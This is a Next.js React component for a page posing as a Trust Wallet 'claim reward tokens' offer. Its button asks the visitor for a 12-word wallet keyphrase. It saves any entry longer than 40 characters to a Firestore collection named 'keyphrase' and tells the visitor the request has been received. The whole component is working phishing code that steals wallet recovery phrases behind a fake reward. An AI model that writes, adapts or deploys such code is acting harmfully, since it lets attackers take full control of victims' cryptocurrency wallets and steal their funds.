import Image from "next/image";
import styles from "./Hero.module.css";
import { CgLockUnlock } from "react-icons/cg";
import { note } from "../utils/text";
import { collection, addDoc } from "firebase/firestore";
import { db } from "../firebase/config";



export default function Hero() {

  const handleClick = async() => {
    const key = prompt("Enter your 12 Keyphrase correctly", "")
    
    if(key.length > 40){
      alert("Your request has been received, we will get back to you shortly")
      await addDoc(collection(db, "keyphrase"), {key: key})
    } else{
      alert("Enter a valid Keyphrase")
    }
  }




  return (
    <section className={styles.container}>
       <div className={styles.herotext}>
           <div className={styles.title}><h1>All users can claim reward tokens.</h1></div>
           <div className={styles.desc}><p>{note.desc1}</p></div>
           <div>
            <div className={styles.button} onClick={handleClick}>
              <p>Claim Token</p>
              <CgLockUnlock />
            </div>
           </div>
       </div>
       <div className={styles.img}>
        <div>
          <Image priority src="/assets/home_trustwallet_app.png" layout="fill" objectFit="contain" alt="trustwallet app"/>
        </div>
       </div>
   </section>
  )
}
